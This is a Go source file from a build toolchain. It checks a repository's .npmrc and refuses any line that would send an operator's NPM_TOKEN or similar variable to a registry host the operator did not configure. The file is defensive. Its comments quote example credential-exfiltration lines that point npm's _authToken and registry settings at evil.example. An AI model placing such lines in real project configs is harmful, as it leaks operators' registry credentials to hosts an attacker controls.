package toolchain

import (
	"errors"
	"fmt"
	"io/fs"
	"net/url"
	"os"
	"regexp"
	"strings"
)

// A repository's own `.npmrc` and the operator's npm credential.
//
// The operator's NPM_TOKEN and npm_config_* reach every npm step (Passthrough),
// and npm expands `${VAR}` inside a project `.npmrc`. So a committed
//
//	//evil.example/:_authToken=${NPM_TOKEN}
//	@acme:registry=https://evil.example/
//
// sends the install's registry credential to a host the publisher chose — with
// BUILD_ALLOW_SCRIPTS off, and before a line of package code runs. Refusing
// every project `.npmrc` would be wrong the other way: committing
// `//registry.corp/:_authToken=${NPM_TOKEN}` is how organizations wire their
// own mirror, and it is exactly what an operator who set NPM_TOKEN expects.
//
// So the rule is about *where* an operator's value may be sent. A credential
// key in a project `.npmrc` may expand an operator-supplied variable only for
// a registry host the operator named — in npm_config_registry, a scoped
// `npm_config_@scope:registry`, or a `npm_config_//host/...` credential key —
// or the public registry. Any other key may not expand one at all: npm expands
// every value, and a registry=, scoped registry or proxy URL carrying the token
// sends it to the host it names. An app's own variables are the app's to send
// where it likes and are not checked.

// npmPublicRegistry is the default registry, which needs no operator naming.
const npmPublicRegistry = "registry.npmjs.org"

// npmCredentialSuffixes are the config keys that carry a credential, bare or
// under a `//host/` prefix.
var npmCredentialSuffixes = []string{"_authToken", "_auth", "_password", "username", "certfile", "keyfile"}

// npmrcExpansion is npm's own name class (@npmcli/config env-replace.js), so
// `${${NPM_TOKEN}` is read as the `${NPM_TOKEN}` npm expands (LB-4).
var npmrcExpansion = regexp.MustCompile(`\$\{([^${}?]+)\??\}`)

// CheckProjectNPMRC refuses a project `.npmrc` in dir that would send an
// operator-supplied variable to a registry the operator did not name. nil when
// there is no `.npmrc`, or when it is harmless.
func CheckProjectNPMRC(dir string) error {
	return checkProjectNPMRC(dir, Passthrough())
}

func checkProjectNPMRC(dir string, operator map[string]string) error {
	raw, err := readProjectNPMRC(dir)
	if err != nil {
		if errors.Is(err, fs.ErrNotExist) {
			return nil
		}
		// npm, running as the account, may read what this could not: a FIFO,
		// a link out of the tree, a file past the bound. Never "no file".
		return fmt.Errorf("this repository's .npmrc is not a regular file the platform "+
			"can read, so npm was not run: %v", err)
	}

	allowed := npmOperatorHosts(operator)
	// The registry an unscoped credential applies to. The operator's wins —
	// npm ranks the environment over a project file — then the project's own.
	defaultHost := hostOf(firstNonEmpty(operator["npm_config_registry"], operator["NPM_CONFIG_REGISTRY"]))
	var projectRegistry string

	type credLine struct{ key, value string }
	var creds []credLine
	// Split rather than scanned: a bufio.Scanner stops at its first line past
	// 64 KiB, and its error went unread — so one long line ended the check.
	for _, line := range strings.Split(string(raw), "\n") {
		line = strings.TrimSpace(line)
		if line == "" || strings.HasPrefix(line, "#") || strings.HasPrefix(line, ";") {
			continue
		}
		key, value, ok := strings.Cut(line, "=")
		if !ok {
			continue
		}
		key, value = strings.TrimSpace(key), strings.TrimSpace(value)
		if !isNPMCredentialKey(key) {
			// npm expands ${VAR} in every value, not only a credential's, so
			// `registry=https://evil.example/${NPM_TOKEN}/` or an https-proxy
			// with the token as its password carries it just as far. Outside
			// a credential key there is no host it may legitimately go to.
			if names := operatorVarsIn(value, operator); len(names) > 0 {
				return fmt.Errorf("this repository's .npmrc puts %s into %s, which is not a "+
					"credential setting — npm would send it wherever that setting points, so it "+
					"was not run. Remove the line from .npmrc", strings.Join(names, ", "), key)
			}
		}
		if key == "registry" {
			projectRegistry = value
			continue
		}
		if isNPMCredentialKey(key) {
			creds = append(creds, credLine{key, value})
		}
	}
	if defaultHost == "" {
		defaultHost = hostOf(projectRegistry)
	}
	if defaultHost == "" {
		defaultHost = npmPublicRegistry
	}

	for _, c := range creds {
		names := operatorVarsIn(c.value, operator)
		if len(names) == 0 {
			continue
		}
		host := defaultHost
		if strings.HasPrefix(c.key, "//") {
			host = hostOf("https:" + c.key)
		}
		if !allowed[host] {
			return fmt.Errorf("this repository's .npmrc sends %s to %s, a registry this install's "+
				"operator has not configured — so it was not run. Name the registry in "+
				"npm_config_registry (or a scoped npm_config_@scope:registry) on the platform, or "+
				"remove the line from .npmrc", strings.Join(names, ", "), host)
		}
	}
	return nil
}

// readProjectNPMRC reads dir/.npmrc the way every read of a tree an app's
// account can rewrite must: inside the tree, without blocking on what it
// opens, regular files only, bounded (security review 2026-11-15, LB-4). On a
// repair the tree is the app's, and a FIFO here parked the repair under the
// build cache lock — and every later build behind it.
func readProjectNPMRC(dir string) ([]byte, error) {
	root, err := os.OpenRoot(dir)
	if err != nil {
		return nil, err
	}
	defer root.Close()
	f, err := root.OpenFile(".npmrc", os.O_RDONLY|OpenNonblock, 0)
	if err != nil {
		return nil, err
	}
	defer f.Close()
	return ReadRegular(f, ".npmrc", MaxManifestBytes)
}

func isNPMCredentialKey(key string) bool {
	for _, s := range npmCredentialSuffixes {
		if key == s || strings.HasSuffix(key, ":"+s) {
			return true
		}
	}
	return false
}

// operatorVarsIn names the operator-supplied variables a value expands.
func operatorVarsIn(value string, operator map[string]string) []string {
	var out []string
	for _, m := range npmrcExpansion.FindAllStringSubmatch(value, -1) {
		name := m[1]
		if _, ok := operator[name]; ok {
			out = append(out, name)
		}
	}
	return out
}

// npmOperatorHosts is every registry host the operator's own environment names,
// plus the public registry.
func npmOperatorHosts(operator map[string]string) map[string]bool {
	hosts := map[string]bool{npmPublicRegistry: true}
	for k, v := range operator {
		lower := strings.ToLower(k)
		if !strings.HasPrefix(lower, "npm_config_") {
			continue
		}
		rest := k[len("npm_config_"):]
		switch {
		case strings.EqualFold(rest, "registry"), strings.HasSuffix(rest, ":registry"):
			if h := hostOf(v); h != "" {
				hosts[h] = true
			}
		case strings.HasPrefix(rest, "//"):
			if h := hostOf("https:" + rest); h != "" {
				hosts[h] = true
			}
		}
	}
	return hosts
}

// hostOf is a registry URL's host and port, lowercased, or "".
func hostOf(raw string) string {
	if raw == "" {
		return ""
	}
	u, err := url.Parse(raw)
	if err != nil {
		return ""
	}
	return strings.ToLower(u.Host)
}

func firstNonEmpty(vals ...string) string {
	for _, v := range vals {
		if v != "" {
			return v
		}
	}
	return ""
}
